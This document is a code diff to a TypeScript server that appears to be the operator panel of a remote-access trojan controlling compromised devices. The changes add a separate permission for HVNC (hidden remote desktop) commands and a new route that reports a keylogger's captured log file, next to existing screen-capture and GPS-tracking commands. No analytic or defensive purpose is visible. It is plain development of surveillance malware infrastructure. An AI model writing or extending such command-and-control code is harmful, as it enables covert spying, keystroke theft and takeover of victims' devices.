@@ -363,20 +363,26 @@ export async function deviceRoutes(app: FastifyInstance) {
       return reply.code(400).send({ success: false, error: 'Invalid command' });
     }
 
-    const screenCommands: CmdType[] = [CMD.SCREEN, CMD.SCREEN_CTRL, CMD.WEBRTC_OFFER, CMD.WEBRTC_ICE, CMD.HVNC, CMD.HVNC_CTRL, CMD.HVNC_OFFER, CMD.HVNC_ANSWER, CMD.HVNC_ICE];
+    const screenCommands: CmdType[] = [CMD.SCREEN, CMD.SCREEN_CTRL, CMD.WEBRTC_OFFER, CMD.WEBRTC_ICE];
+    const hvncCommands: CmdType[] = [CMD.HVNC, CMD.HVNC_CTRL, CMD.HVNC_OFFER, CMD.HVNC_ANSWER, CMD.HVNC_ICE];
+    const allRealtimeCommands = [...screenCommands, ...hvncCommands];
     const user = getRequestUser(request);
-    const requiredPermission: Permission = screenCommands.includes(cmdType) ? 'device:screen' : 'device:command';
+    const requiredPermission: Permission = hvncCommands.includes(cmdType)
+      ? 'device:hvnc'
+      : screenCommands.includes(cmdType)
+        ? 'device:screen'
+        : 'device:command';
     if (!user.permissions?.includes(requiredPermission)) {
       return reply.code(403).send({ success: false, error: 'Insufficient command permission' });
     }
 
-    if (screenCommands.includes(cmdType)) {
+    if (allRealtimeCommands.includes(cmdType)) {
       const validationError = validateRealtimeCommand(cmdType, params);
       if (validationError) return reply.code(400).send({ success: false, error: validationError });
     }
 
     const sent = socketService.send(id, cmdType, params);
-    return { success: true, sent, queued: !sent && !screenCommands.includes(cmdType) };
+    return { success: true, sent, queued: !sent && !allRealtimeCommands.includes(cmdType) };
   });
 
   app.post('/api/gps/:id/:interval', {
@@ -483,6 +489,10 @@ function getPageData(id: string, page: string, client: any) {
     case 'keylogger_status': {
       const raw = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'keylogger_status'));
       return raw || { enabled: null, queued: 0, checkedAt: null };
+    }
+    case 'keylogger_log_info': {
+      const raw = safeJsonParse(dbHelpers.getOrCreateClientData(id, 'keylogger_log_info'), null);
+      return raw || { path: '', size: 0, name: '', checkedAt: null };
     }
     case 'screen':
       return {};  // WebRTC media and real-time screen state are not stored in DB.
